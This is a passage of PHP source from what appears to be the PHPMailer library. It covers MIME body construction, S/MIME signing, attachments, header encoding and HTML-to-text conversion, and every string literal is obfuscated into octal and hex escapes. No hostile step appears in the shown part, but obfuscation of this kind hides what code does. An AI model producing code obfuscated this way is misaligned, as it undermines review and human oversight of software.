$this->LE . $this->LE; $body .= $this->attachAll("\141\164\x74\141\x63\x68\155\145\156\x74", $this->boundary[1]); break; case "\151\x6e\154\x69\x6e\x65\137\141\x74\164\141\x63\x68": $body .= $mimepre; $body .= $this->textLine("\x2d\x2d" . $this->boundary[1]); $body .= $this->headerLine("\x43\x6f\156\164\x65\x6e\x74\55\x54\x79\160\145", "\x6d\x75\154\164\151\x70\141\162\164\x2f\162\145\154\141\164\145\x64\x3b"); $body .= $this->textLine("\x9\142\x6f\x75\x6e\x64\x61\x72\x79\x3d\x22" . $this->boundary[2] . "\x22"); $body .= $this->LE; $body .= $this->getBoundary($this->boundary[2], $bodyCharSet, '', $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= $this->LE . $this->LE; $body .= $this->attachAll("\x69\156\154\151\x6e\145", $this->boundary[2]); $body .= $this->LE; $body .= $this->attachAll("\141\164\x74\141\x63\x68\155\145\156\x74", $this->boundary[1]); break; case "\141\x6c\x74": $body .= $mimepre; $body .= $this->getBoundary($this->boundary[1], $altBodyCharSet, "\x74\145\x78\164\x2f\x70\154\x61\151\x6e", $altBodyEncoding); $body .= $this->encodeString($this->AltBody, $altBodyEncoding); $body .= $this->LE . $this->LE; $body .= $this->getBoundary($this->boundary[1], $bodyCharSet, "\164\x65\170\164\x2f\x68\x74\x6d\154", $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= $this->LE . $this->LE; if (!empty($this->Ical)) { $body .= $this->getBoundary($this->boundary[1], '', "\x74\x65\x78\x74\x2f\143\x61\x6c\145\x6e\144\x61\162\73\40\x6d\145\164\x68\x6f\x64\x3d\122\105\121\x55\x45\123\x54", ''); $body .= $this->encodeString($this->Ical, $this->Encoding); $body .= $this->LE . $this->LE; } $body .= $this->endBoundary($this->boundary[1]); break; case "\141\x6c\x74\137\x69\x6e\154\151\x6e\145": $body .= $mimepre; $body .= $this->getBoundary($this->boundary[1], $altBodyCharSet, "\x74\x65\x78\164\57\x70\154\x61\x69\156", $altBodyEncoding); $body .= $this->encodeString($this->AltBody, $altBodyEncoding); $body .= $this->LE . $this->LE; $body .= $this->textLine("\x2d\55" . $this->boundary[1]); $body .= $this->headerLine("\103\x6f\x6e\x74\x65\x6e\x74\x2d\x54\171\160\x65", "\x6d\165\x6c\x74\x69\160\141\162\x74\x2f\162\145\154\141\164\145\x64\x3b"); $body .= $this->textLine("\x9\142\157\x75\156\x64\141\x72\x79\x3d\42" . $this->boundary[2] . "\x22"); $body .= $this->LE; $body .= $this->getBoundary($this->boundary[2], $bodyCharSet, "\164\x65\x78\164\x2f\150\x74\155\x6c", $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= $this->LE . $this->LE; $body .= $this->attachAll("\x69\x6e\154\x69\x6e\145", $this->boundary[2]); $body .= $this->LE; $body .= $this->endBoundary($this->boundary[1]); break; case "\x61\x6c\164\137\x61\x74\164\141\x63\x68": $body .= $mimepre; $body .= $this->textLine("\55\x2d" . $this->boundary[1]); $body .= $this->headerLine("\x43\157\156\164\145\x6e\164\x2d\x54\x79\x70\x65", "\x6d\x75\x6c\164\x69\x70\x61\162\x74\57\141\154\164\145\x72\156\141\x74\x69\x76\145\73"); $body .= $this->textLine("\11\142\x6f\165\x6e\x64\141\x72\171\75\x22" . $this->boundary[2] . "\42"); $body .= $this->LE; $body .= $this->getBoundary($this->boundary[2], $altBodyCharSet, "\164\145\x78\164\57\160\x6c\x61\151\156", $altBodyEncoding); $body .= $this->encodeString($this->AltBody, $altBodyEncoding); $body .= $this->LE . $this->LE; $body .= $this->getBoundary($this->boundary[2], $bodyCharSet, "\x74\x65\x78\x74\57\150\164\155\x6c", $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= $this->LE . $this->LE; $body .= $this->endBoundary($this->boundary[2]); $body .= $this->LE; $body .= $this->attachAll("\141\164\164\141\143\150\155\145\156\164", $this->boundary[1]); break; case "\141\154\164\137\151\x6e\154\151\156\145\x5f\141\x74\x74\x61\x63\150": $body .= $mimepre; $body .= $this->textLine("\x2d\55" . $this->boundary[1]); $body .= $this->headerLine("\103\x6f\x6e\x74\x65\156\x74\x2d\124\x79\160\x65", "\x6d\165\x6c\164\151\x70\141\162\x74\57\141\x6c\164\145\162\x6e\x61\164\151\x76\145\73"); $body .= $this->textLine("\x9\142\x6f\x75\156\144\141\x72\x79\75\x22" . $this->boundary[2] . "\x22"); $body .= $this->LE; $body .= $this->getBoundary($this->boundary[2], $altBodyCharSet, "\x74\x65\x78\164\x2f\x70\154\x61\x69\x6e", $altBodyEncoding); $body .= $this->encodeString($this->AltBody, $altBodyEncoding); $body .= $this->LE . $this->LE; $body .= $this->textLine("\55\x2d" . $this->boundary[2]); $body .= $this->headerLine("\x43\157\156\164\145\x6e\164\x2d\124\x79\160\x65", "\x6d\x75\x6c\164\x69\x70\x61\162\164\57\162\145\x6c\141\x74\x65\144\x3b"); $body .= $this->textLine("\x9\x62\x6f\x75\x6e\144\x61\162\x79\x3d\x22" . $this->boundary[3] . "\x22"); $body .= $this->LE; $body .= $this->getBoundary($this->boundary[3], $bodyCharSet, "\x74\145\170\164\x2f\150\x74\155\x6c", $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= $this->LE . $this->LE; $body .= $this->attachAll("\151\156\x6c\x69\x6e\x65", $this->boundary[3]); $body .= $this->LE; $body .= $this->endBoundary($this->boundary[2]); $body .= $this->LE; $body .= $this->attachAll("\141\164\x74\141\143\150\155\145\156\x74", $this->boundary[1]); break; default: $this->Encoding = $bodyEncoding; $body .= $this->encodeString($this->Body, $this->Encoding); break; } if ($this->isError()) { $body = ''; } elseif ($this->sign_key_file) { try { if (!defined("\x50\x4b\103\x53\67\137\x54\x45\130\x54")) { throw new phpmailerException($this->lang("\x65\x78\164\x65\156\x73\151\x6f\x6e\137\155\151\163\163\151\156\x67") . "\157\160\x65\156\163\x73\x6c"); } $file = tempnam(sys_get_temp_dir(), "\x6d\x61\151\154"); if (false === file_put_contents($file, $body)) { throw new phpmailerException($this->lang("\x73\x69\147\156\151\x6e\x67") . "\40\103\x6f\x75\x6c\x64\x20\156\x6f\x74\x20\167\162\x69\x74\x65\40\164\145\x6d\x70\40\146\x69\154\x65"); } $signed = tempnam(sys_get_temp_dir(), "\x73\x69\x67\156\145\144"); if (empty($this->sign_extracerts_file)) { $sign = @openssl_pkcs7_sign($file, $signed, "\x66\x69\154\145\72\x2f\x2f" . realpath($this->sign_cert_file), array("\x66\151\x6c\145\72\57\x2f" . realpath($this->sign_key_file), $this->sign_key_pass), null); } else { $sign = @openssl_pkcs7_sign($file, $signed, "\146\151\x6c\145\72\x2f\57" . realpath($this->sign_cert_file), array("\146\151\154\x65\x3a\57\57" . realpath($this->sign_key_file), $this->sign_key_pass), null, PKCS7_DETACHED, $this->sign_extracerts_file); } if ($sign) { @unlink($file); $body = file_get_contents($signed); @unlink($signed); $parts = explode("\xa\xa", $body, 2); $this->MIMEHeader .= $parts[0] . $this->LE . $this->LE; $body = $parts[1]; } else { @unlink($file); @unlink($signed); throw new phpmailerException($this->lang("\x73\151\147\156\151\156\147") . openssl_error_string()); } } catch (phpmailerException $exc) { $body = ''; if ($this->exceptions) { throw $exc; } } } return $body; } protected function getBoundary($boundary, $charSet, $contentType, $encoding) { $result = ''; if ($charSet == '') { $charSet = $this->CharSet; } if ($contentType == '') { $contentType = $this->ContentType; } if ($encoding == '') { $encoding = $this->Encoding; } $result .= $this->textLine("\x2d\55" . $boundary); $result .= sprintf("\103\x6f\156\x74\x65\x6e\164\55\124\171\160\145\72\x20\45\x73\x3b\40\143\150\x61\162\x73\x65\x74\x3d\x25\163", $contentType, $charSet); $result .= $this->LE; if ($encoding != "\x37\142\151\164") { $result .= $this->headerLine("\103\157\156\x74\145\156\x74\x2d\x54\162\x61\x6e\163\146\145\162\55\x45\x6e\x63\x6f\144\151\156\147", $encoding); } $result .= $this->LE; return $result; } protected function endBoundary($boundary) { return $this->LE . "\x2d\x2d" . $boundary . "\55\x2d" . $this->LE; } protected function setMessageType() { $type = array(); if ($this->alternativeExists()) { $type[] = "\141\x6c\x74"; } if ($this->inlineImageExists()) { $type[] = "\x69\x6e\x6c\151\x6e\145"; } if ($this->attachmentExists()) { $type[] = "\x61\x74\164\x61\x63\x68"; } $this->message_type = implode("\137", $type); if ($this->message_type == '') { $this->message_type = "\160\x6c\141\x69\x6e"; } } public function headerLine($name, $value) { return $name . "\72\x20" . $value . $this->LE; } public function textLine($value) { return $value . $this->LE; } public function addAttachment($path, $name = '', $encoding = "\x62\141\x73\145\66\64", $type = '', $disposition = "\x61\164\x74\141\x63\x68\x6d\x65\156\164") { try { if (!self::isPermittedPath($path) or !@is_file($path)) { throw new phpmailerException($this->lang("\146\x69\154\145\x5f\x61\x63\x63\145\163\x73") . $path, self::STOP_CONTINUE); } if ($type == '') { $type = self::filenameToType($path); } $filename = basename($path); if ($name == '') { $name = $filename; } $this->attachment[] = array(0 => $path, 1 => $filename, 2 => $name, 3 => $encoding, 4 => $type, 5 => false, 6 => $disposition, 7 => 0); } catch (phpmailerException $exc) { $this->setError($exc->getMessage()); $this->edebug($exc->getMessage()); if ($this->exceptions) { throw $exc; } return false; } return true; } public function getAttachments() { return $this->attachment; } protected function attachAll($disposition_type, $boundary) { $mime = array(); $cidUniq = array(); $incl = array(); foreach ($this->attachment as $attachment) { if ($attachment[6] == $disposition_type) { $string = ''; $path = ''; $bString = $attachment[5]; if ($bString) { $string = $attachment[0]; } else { $path = $attachment[0]; } $inclhash = md5(serialize($attachment)); if (in_array($inclhash, $incl)) { continue; } $incl[] = $inclhash; $name = $attachment[2]; $encoding = $attachment[3]; $type = $attachment[4]; $disposition = $attachment[6]; $cid = $attachment[7]; if ($disposition == "\151\x6e\154\x69\156\145" && array_key_exists($cid, $cidUniq)) { continue; } $cidUniq[$cid] = true; $mime[] = sprintf("\55\x2d\45\163\45\x73", $boundary, $this->LE); if (!empty($name)) { $mime[] = sprintf("\103\157\156\164\145\156\x74\55\x54\171\x70\145\72\x20\x25\163\73\x20\156\x61\x6d\x65\x3d\x22\x25\x73\42\x25\163", $type, $this->encodeHeader($this->secureHeader($name)), $this->LE); } else { $mime[] = sprintf("\103\x6f\156\x74\145\x6e\x74\x2d\124\171\x70\145\72\40\x25\x73\x25\163", $type, $this->LE); } if ($encoding != "\67\142\151\164") { $mime[] = sprintf("\x43\157\156\164\x65\156\164\55\124\162\x61\156\163\146\145\162\55\x45\x6e\143\x6f\x64\x69\156\x67\72\40\45\x73\45\163", $encoding, $this->LE); } if ($disposition == "\151\156\154\151\156\145") { $mime[] = sprintf("\x43\157\x6e\164\x65\x6e\164\55\111\104\x3a\x20\74\45\x73\x3e\45\163", $cid, $this->LE); } if (!empty($disposition)) { $encoded_name = $this->encodeHeader($this->secureHeader($name)); if (preg_match("\57\x5b\x20\x5c\x28\x5c\51\74\76\100\x2c\x3b\x3a\134\42\134\x2f\x5c\133\x5c\x5d\x5c\77\75\x5d\x2f", $encoded_name)) { $mime[] = sprintf("\103\157\x6e\164\145\x6e\164\x2d\104\x69\163\x70\157\x73\151\164\151\157\156\x3a\x20\x25\163\73\40\x66\151\154\145\156\141\155\x65\75\42\45\163\42\x25\163", $disposition, $encoded_name, $this->LE . $this->LE); } else { if (!empty($encoded_name)) { $mime[] = sprintf("\x43\x6f\x6e\164\145\156\x74\55\x44\x69\163\160\157\163\151\x74\x69\x6f\156\x3a\x20\45\x73\73\x20\146\151\x6c\145\156\x61\x6d\145\75\x25\x73\45\163", $disposition, $encoded_name, $this->LE . $this->LE); } else { $mime[] = sprintf("\x43\157\x6e\164\145\156\x74\x2d\x44\151\163\x70\157\x73\x69\164\x69\157\156\72\x20\x25\163\x25\163", $disposition, $this->LE . $this->LE); } } } else { $mime[] = $this->LE; } if ($bString) { $mime[] = $this->encodeString($string, $encoding); if ($this->isError()) { return ''; } $mime[] = $this->LE . $this->LE; } else { $mime[] = $this->encodeFile($path, $encoding); if ($this->isError()) { return ''; } $mime[] = $this->LE . $this->LE; } } } $mime[] = sprintf("\x2d\55\x25\x73\x2d\x2d\x25\x73", $boundary, $this->LE); return implode('', $mime); } protected function encodeFile($path, $encoding = "\142\x61\163\145\x36\64") { try { if (!self::isPermittedPath($path) or !file_exists($path)) { throw new phpmailerException($this->lang("\146\x69\154\145\137\x6f\160\x65\156") . $path, self::STOP_CONTINUE); } $magic_quotes = false; if (version_compare(PHP_VERSION, "\x37\x2e\64\x2e\60", "\74")) { $magic_quotes = get_magic_quotes_runtime(); } if ($magic_quotes) { if (version_compare(PHP_VERSION, "\x35\x2e\63\x2e\x30", "\x3c")) { set_magic_quotes_runtime(false); } else { ini_set("\155\x61\147\151\143\x5f\x71\165\x6f\164\x65\163\x5f\162\x75\x6e\x74\151\x6d\x65", false); } } $file_buffer = file_get_contents($path); $file_buffer = $this->encodeString($file_buffer, $encoding); if ($magic_quotes) { if (version_compare(PHP_VERSION, "\x35\x2e\63\x2e\60", "\74")) { set_magic_quotes_runtime($magic_quotes); } else { ini_set("\x6d\141\x67\x69\143\137\x71\165\157\164\x65\x73\x5f\x72\165\x6e\x74\x69\155\x65", $magic_quotes); } } return $file_buffer; } catch (Exception $exc) { $this->setError($exc->getMessage()); return ''; } } public function encodeString($str, $encoding = "\x62\141\163\145\66\64") { $encoded = ''; switch (strtolower($encoding)) { case "\142\141\163\x65\66\x34": $encoded = chunk_split(base64_encode($str), 76, $this->LE); break; case "\x37\x62\151\x74": case "\x38\x62\x69\x74": $encoded = $this->fixEOL($str); if (substr($encoded, -strlen($this->LE)) != $this->LE) { $encoded .= $this->LE; } break; case "\142\151\156\x61\162\171": $encoded = $str; break; case "\x71\165\157\x74\x65\144\x2d\160\x72\151\x6e\x74\141\142\154\x65": $encoded = $this->encodeQP($str); break; default: $this->setError($this->lang("\145\156\143\157\x64\x69\x6e\147") . $encoding); break; } return $encoded; } public function encodeHeader($str, $position = "\164\x65\170\x74") { $matchcount = 0; switch (strtolower($position)) { case "\x70\x68\162\x61\163\x65": if (!preg_match("\x2f\x5b\x5c\62\60\x30\55\134\x33\x37\67\x5d\57", $str)) { $encoded = addcslashes($str, "\0\x2e\56\37\177\134\x22"); if ($str == $encoded && !preg_match("\57\x5b\136\101\x2d\132\141\x2d\172\60\x2d\71\x21\x23\x24\45\46\47\x2a\x2b\x5c\57\x3d\77\136\x5f\x60\173\174\175\176\x20\55\135\57", $str)) { return $encoded; } else { return "\42{$encoded}\x22"; } } $matchcount = preg_match_all("\57\133\x5e\x5c\x30\64\60\134\x30\x34\x31\134\x30\x34\x33\x2d\134\x31\63\x33\134\61\63\x35\55\x5c\x31\67\66\x5d\x2f", $str, $matches); break; case "\143\157\x6d\155\x65\156\x74": $matchcount = preg_match_all("\57\x5b\x28\x29\42\135\x2f", $str, $matches); case "\164\x65\170\x74": default: $matchcount += preg_match_all("\57\x5b\134\60\60\x30\x2d\x5c\x30\61\60\x5c\60\61\x33\x5c\60\61\x34\x5c\x30\x31\x36\x2d\x5c\x30\x33\67\x5c\x31\x37\67\x2d\134\63\67\67\135\57", $str, $matches); break; } if ($matchcount == 0) { return $str; } $maxlen = 75 - 7 - strlen($this->CharSet); if ($matchcount > strlen($str) / 3) { $encoding = "\x42"; if (function_exists("\x6d\x62\137\x73\164\x72\x6c\x65\156") && $this->hasMultiBytes($str)) { $encoded = $this->base64EncodeWrapMB($str, "\12"); } else { $encoded = base64_encode($str); $maxlen -= $maxlen % 4; $encoded = trim(chunk_split($encoded, $maxlen, "\xa")); } } else { $encoding = "\121"; $encoded = $this->encodeQ($str, $position); $encoded = $this->wrapText($encoded, $maxlen, true); $encoded = str_replace("\x3d" . self::CRLF, "\12", trim($encoded)); } $encoded = preg_replace("\x2f\136\x28\56\52\51\44\x2f\x6d", "\40\x3d\x3f" . $this->CharSet . "\x3f{$encoding}\x3f\x5c\61\x3f\x3d", $encoded); $encoded = trim(str_replace("\12", $this->LE, $encoded)); return $encoded; } public function hasMultiBytes($str) { if (function_exists("\x6d\142\137\163\164\x72\154\x65\x6e")) { return strlen($str) > mb_strlen($str, $this->CharSet); } else { return false; } } public function has8bitChars($text) { return (bool) preg_match("\57\x5b\134\x78\x38\60\55\x5c\170\x46\106\135\x2f", $text); } public function base64EncodeWrapMB($str, $linebreak = null) { $start = "\x3d\77" . $this->CharSet . "\77\102\77"; $end = "\x3f\x3d"; $encoded = ''; if ($linebreak === null) { $linebreak = $this->LE; } $mb_length = mb_strlen($str, $this->CharSet); $length = 75 - strlen($start) - strlen($end); $ratio = $mb_length / strlen($str); $avgLength = floor($length * $ratio * 0.75); for ($i = 0; $i < $mb_length; $i += $offset) { $lookBack = 0; do { $offset = $avgLength - $lookBack; $chunk = mb_substr($str, $i, $offset, $this->CharSet); $chunk = base64_encode($chunk); $lookBack++; } while (strlen($chunk) > $length); $encoded .= $chunk . $linebreak; } $encoded = substr($encoded, 0, -strlen($linebreak)); return $encoded; } public function encodeQP($string, $line_max = 76) { if (function_exists("\x71\x75\157\x74\x65\144\x5f\x70\162\151\x6e\x74\x61\x62\154\145\137\x65\156\x63\157\144\145")) { return quoted_printable_encode($string); } $string = str_replace(array("\x25\62\x30", "\45\x30\104\x25\x30\x41\56", "\45\60\x44\x25\60\x41", "\x25"), array("\x20", "\15\xa\x3d\x32\105", "\15\12", "\x3d"), rawurlencode($string)); return preg_replace("\x2f\133\x5e\134\x72\134\x6e\135\x7b" . ($line_max - 3) . "\x7d\x5b\136\75\x5c\x72\134\156\x5d\x7b\x32\175\57", "\x24\x30\75\xd\xa", $string); } public function encodeQPphp($string, $line_max = 76, $space_conv = false) { return $this->encodeQP($string, $line_max); } public function encodeQ($str, $position = "\x74\145\170\x74") { $pattern = ''; $encoded = str_replace(array("\15", "\xa"), '', $str); switch (strtolower($position)) { case "\160\150\x72\x61\163\x65": $pattern = "\136\101\x2d\x5a\141\55\x7a\x30\x2d\x39\x21\52\53\x5c\57\x20\55"; break; case "\x63\157\x6d\x6d\x65\156\164": $pattern = "\134\x28\x5c\51\x22"; case "\164\145\170\164": default: $pattern = "\x5c\60\x30\60\x2d\134\x30\x31\x31\x5c\x30\x31\63\134\x30\x31\x34\134\x30\61\x36\x2d\x5c\x30\63\x37\x5c\60\67\x35\134\60\x37\67\x5c\x31\63\x37\x5c\61\x37\67\x2d\x5c\x33\x37\x37" . $pattern; break; } $matches = array(); if (preg_match_all("\57\x5b{$pattern}\135\57", $encoded, $matches)) { $eqkey = array_search("\x3d", $matches[0]); if (false !== $eqkey) { unset($matches[0][$eqkey]); array_unshift($matches[0], "\x3d"); } foreach (array_unique($matches[0]) as $char) { $encoded = str_replace($char, "\x3d" . sprintf("\x25\x30\62\130", ord($char)), $encoded); } } return str_replace("\40", "\137", $encoded); } public function addStringAttachment($string, $filename, $encoding = "\142\141\163\x65\x36\x34", $type = '', $disposition = "\141\x74\164\141\143\150\x6d\x65\156\x74") { if ($type == '') { $type = self::filenameToType($filename); } $this->attachment[] = array(0 => $string, 1 => $filename, 2 => basename($filename), 3 => $encoding, 4 => $type, 5 => true, 6 => $disposition, 7 => 0); } public function addEmbeddedImage($path, $cid, $name = '', $encoding = "\x62\x61\163\x65\x36\x34", $type = '', $disposition = "\151\x6e\154\151\156\x65") { if (!self::isPermittedPath($path) or !@is_file($path)) { $this->setError($this->lang("\x66\151\x6c\x65\x5f\141\x63\143\145\163\x73") . $path); return false; } if ($type == '') { $type = self::filenameToType($path); } $filename = basename($path); if ($name == '') { $name = $filename; } $this->attachment[] = array(0 => $path, 1 => $filename, 2 => $name, 3 => $encoding, 4 => $type, 5 => false, 6 => $disposition, 7 => $cid); return true; } public function addStringEmbeddedImage($string, $cid, $name = '', $encoding = "\x62\x61\x73\145\x36\64", $type = '', $disposition = "\151\156\154\151\156\x65") { if ($type == '' and !empty($name)) { $type = self::filenameToType($name); } $this->attachment[] = array(0 => $string, 1 => $name, 2 => $name, 3 => $encoding, 4 => $type, 5 => true, 6 => $disposition, 7 => $cid); return true; } public function inlineImageExists() { foreach ($this->attachment as $attachment) { if ($attachment[6] == "\151\156\x6c\151\156\x65") { return true; } } return false; } public function attachmentExists() { foreach ($this->attachment as $attachment) { if ($attachment[6] == "\x61\x74\164\141\x63\150\155\x65\x6e\164") { return true; } } return false; } public function alternativeExists() { return !empty($this->AltBody); } public function clearQueuedAddresses($kind) { $RecipientsQueue = $this->RecipientsQueue; foreach ($RecipientsQueue as $address => $params) { if ($params[0] == $kind) { unset($this->RecipientsQueue[$address]); } } } public function clearAddresses() { foreach ($this->to as $to) { unset($this->all_recipients[strtolower($to[0])]); } $this->to = array(); $this->clearQueuedAddresses("\164\157"); } public function clearCCs() { foreach ($this->cc as $cc) { unset($this->all_recipients[strtolower($cc[0])]); } $this->cc = array(); $this->clearQueuedAddresses("\x63\x63"); } public function clearBCCs() { foreach ($this->bcc as $bcc) { unset($this->all_recipients[strtolower($bcc[0])]); } $this->bcc = array(); $this->clearQueuedAddresses("\x62\x63\143"); } public function clearReplyTos() { $this->ReplyTo = array(); $this->ReplyToQueue = array(); } public function clearAllRecipients() { $this->to = array(); $this->cc = array(); $this->bcc = array(); $this->all_recipients = array(); $this->RecipientsQueue = array(); } public function clearAttachments() { $this->attachment = array(); } public function clearCustomHeaders() { $this->CustomHeader = array(); } protected function setError($msg) { $this->error_count++; if ($this->Mailer == "\x73\155\164\160" and !is_null($this->smtp)) { $lasterror = $this->smtp->getError(); if (!empty($lasterror["\x65\x72\162\x6f\x72"])) { $msg .= $this->lang("\163\155\164\160\x5f\145\x72\162\x6f\x72") . $lasterror["\145\x72\x72\x6f\162"]; if (!empty($lasterror["\x64\145\x74\x61\151\154"])) { $msg .= "\x20\104\145\x74\141\x69\x6c\x3a\40" . $lasterror["\x64\145\164\141\x69\154"]; } if (!empty($lasterror["\x73\x6d\x74\160\x5f\143\x6f\x64\x65"])) { $msg .= "\40\123\115\x54\120\x20\143\x6f\x64\x65\72\x20" . $lasterror["\x73\155\164\x70\137\143\x6f\144\x65"]; } if (!empty($lasterror["\x73\155\x74\160\137\x63\157\144\x65\137\x65\170"])) { $msg .= "\x20\101\x64\144\151\164\151\157\x6e\141\154\x20\123\115\x54\120\x20\x69\156\146\x6f\72\40" . $lasterror["\x73\155\164\160\137\x63\x6f\144\145\137\145\x78"]; } } } $this->ErrorInfo = $msg; } public static function rfcDate() { date_default_timezone_set(@date_default_timezone_get()); return date("\x44\x2c\40\152\40\x4d\x20\x59\x20\110\x3a\151\x3a\x73\x20\x4f"); } protected function serverHostname() { $result = "\154\157\143\141\x6c\x68\157\163\x74\x2e\x6c\157\143\x61\154\144\157\155\141\x69\156"; if (!empty($this->Hostname)) { $result = $this->Hostname; } elseif (isset($_SERVER) and array_key_exists("\123\105\122\126\x45\122\137\x4e\x41\115\105", $_SERVER) and !empty($_SERVER["\123\x45\122\x56\105\122\x5f\116\x41\x4d\105"])) { $result = $_SERVER["\123\105\122\126\105\x52\x5f\x4e\x41\x4d\x45"]; } elseif (function_exists("\x67\145\164\x68\x6f\x73\x74\x6e\x61\155\x65") && gethostname() !== false) { $result = gethostname(); } elseif (php_uname("\x6e") !== false) { $result = php_uname("\156"); } return $result; } protected function lang($key) { if (count($this->language) < 1) { $this->setLanguage("\145\156"); } if (array_key_exists($key, $this->language)) { if ($key == "\163\155\164\x70\137\x63\x6f\x6e\x6e\145\x63\x74\137\146\x61\151\x6c\x65\x64") { return $this->language[$key] . "\x20\150\x74\164\x70\163\x3a\57\x2f\147\x69\164\150\165\142\56\143\x6f\155\x2f\x50\110\x50\x4d\x61\151\x6c\x65\162\57\x50\x48\x50\115\141\x69\154\x65\x72\57\167\x69\153\x69\x2f\124\162\x6f\x75\142\154\x65\163\150\157\x6f\164\x69\156\147"; } return $this->language[$key]; } else { return $key; } } public function isError() { return $this->error_count > 0; } public function fixEOL($str) { $nstr = str_replace(array("\xd\xa", "\xd"), "\xa", $str); if ($this->LE !== "\12") { $nstr = str_replace("\xa", $this->LE, $nstr); } return $nstr; } public function addCustomHeader($name, $value = null) { if ($value === null) { $this->CustomHeader[] = explode("\x3a", $name, 2); } else { $this->CustomHeader[] = array($name, $value); } } public function getCustomHeaders() { return $this->CustomHeader; } public function msgHTML($message, $basedir = '', $advanced = false) { preg_match_all("\57\50\x73\162\x63\174\142\x61\143\153\147\162\x6f\x75\x6e\144\51\75\x5b\x22\x27\135\50\x2e\52\x29\133\42\x27\x5d\x2f\125\151", $message, $images); if (array_key_exists(2, $images)) { if (strlen($basedir) > 1 && substr($basedir, -1) != "\57") { $basedir .= "\57"; } foreach ($images[2] as $imgindex => $url) { if (preg_match("\43\x5e\144\141\x74\141\72\x28\151\x6d\141\147\145\133\136\x3b\54\x5d\52\51\x28\73\142\x61\x73\145\66\64\x29\x3f\54\43", $url, $match)) { $data = substr($url, strpos($url, "\x2c")); if ($match[2]) { $data = base64_decode($data); } else { $data = rawurldecode($data); } $cid = md5($url) . "\x40\160\x68\x70\x6d\x61\151\x6c\x65\x72\x2e\x30"; if ($this->addStringEmbeddedImage($data, $cid, "\x65\x6d\142\x65\x64" . $imgindex, "\x62\x61\x73\x65\x36\x34", $match[1])) { $message = str_replace($images[0][$imgindex], $images[1][$imgindex] . "\x3d\x22\143\151\x64\x3a" . $cid . "\42", $message); } continue; } if (!empty($basedir) && strpos($url, "\56\x2e") === false && substr($url, 0, 4) !== "\143\x69\144\x3a" && !preg_match("\43\x5e\x5b\x61\55\172\x5d\x5b\x61\55\x7a\x30\55\71\53\x2e\x2d\135\52\72\x3f\x2f\57\43\x69", $url)) { $filename = basename($url); $directory = dirname($url); if ($directory == "\x2e") { $directory = ''; } $cid = md5($url) . "\100\160\x68\160\155\x61\151\x6c\x65\x72\56\60"; if (strlen($directory) > 1 && substr($directory, -1) != "\x2f") { $directory .= "\57"; } if ($this->addEmbeddedImage($basedir . $directory . $filename, $cid, $filename, "\142\x61\163\x65\66\x34", self::_mime_types((string) self::mb_pathinfo($filename, PATHINFO_EXTENSION)))) { $message = preg_replace("\x2f" . $images[1][$imgindex] . "\75\x5b\x22\x27\x5d" . preg_quote($url, "\57") . "\x5b\42\x27\x5d\x2f\x55\x69", $images[1][$imgindex] . "\x3d\42\143\151\x64\72" . $cid . "\42", $message); } } } } $this->isHTML(true); $this->Body = $this->normalizeBreaks($message); $this->AltBody = $this->normalizeBreaks($this->html2text($message, $advanced)); if (!$this->alternativeExists()) { $this->AltBody = "\x54\157\x20\166\151\x65\x77\40\x74\x68\x69\163\40\x65\155\141\x69\154\x20\x6d\x65\163\x73\x61\147\x65\x2c\40\x6f\x70\145\156\x20\151\x74\x20\151\156\40\x61\x20\160\162\x6f\147\x72\x61\x6d\40\x74\150\141\164\x20\x75\156\x64\145\x72\163\164\141\156\144\x73\x20\x48\124\115\x4c\41" . self::CRLF . self::CRLF; } return $this->Body; } public function html2text($html, $advanced = false) { if (is_callable($advanced)) { return call_user_func($advanced, $html); } return html_entity_decode(trim(strip_tags(preg_replace("\57\74\50\x68\x65\141\x64\x7c\164\x69\164\154\x65\x7c\x73\x74\x79\154\x65\174\x73\143\x72\x69\160\164\51\133\x5e\x3e\135\x2a\x3e\x2e\x2a\77\74\x5c\57\134\61\x3e\x2f\163\151", '', $html))), ENT_QUOTES, $this->CharSet); } public static function _mime_types($ext = '') { $mimes = array("\x78\154" => "\141\x70\x70\154\151\143\141\164\151\x6f\x6e\x2f\x65\170\143\145\x6c", "\x6a\x73" => "\141\160\160\x6c\151\x63\141\164\151\157\156\x2f\152\x61\x76\141\x73\143\162\151\160\164", "\x68\x71\x78" => "\141\160\160\x6c\x69\x63\141\x74\151\x6f\x6e\x2f\155\x61\x63\55\x62\x69\x6e\150\145\170\x34\60", "\x63\160\x74" => "\141\x70\x70\154\151\x63\x61\x74\151\x6f\156\57\x6d\141\x63\55\x63\157\x6d\160\x61\x63\164\x70\162\157", "\142\x69\156" => "\x61\160\160\154\151\x63\x61\x74\151\157\156\57\x6d\141\143\142\x69\x6e\141\162\171", "\144\157\x63" => "\141\x70\x70\154\x69\x63\141\x74\x69\157\156\57\x6d\x73\167\x6f\x72\x64", "\x77\x6f\x72\144" => "\141\160\160\x6c\x69\x63\x61\x74\x69\x6f\156\57\x6d\163\167\x6f\162\144", "\x78\154\x73\x78" => "\141\160\x70\154\151\143\141\164\151\157\156\57\166\x6e\x64\56\157\160\x65\x6e\170\x6d\x6c\146\157\x72\x6d\141\x74\163\x2d\x6f\146\x66\x69\x63\145\144\157\143\165\155\x65\x6e\x74\56\x73\x70\162\145\x61\x64\x73\x68\x65\145\164\x6d\x6c\56\x73\x68\x65\145\x74", "\170\154\x74\x78" => "\x61\160\160\x6c\151\143\141\x74\151\157\x6e\x2f\166\156\x64\56\x6f\x70\x65\x6e\x78\155\154\146\157\162\x6d\141\164\x73\55\x6f\x66\x66\151\143\145\x64\157\143\x75\x6d\x65\x6e\x74\56\x73\x70\x72\145\141\144\163\150\x65\145\x74\x6d\x6c\x2e\x74\145\x6d\x70\154\141\164\x65", "\x70\157\x74\x78" => "\x61\160\160\154\x69\x63\x61\164\151\x6f\156\57\x76\156\x64\56\157\x70\145\156\170\x6d\x6c\146\157\x72\155\141\164\163\x2d\157\146\146\x69\x63\x65\x64\x6f\x63\x75\x6d\x65\x6e\164\x2e\160\x72\145\163\145\156\164\x61\164\x69\x6f\x6e\155\x6c\x2e\164\145\155\x70\154\x61\164\x65", "\x70\x70\163\x78" => 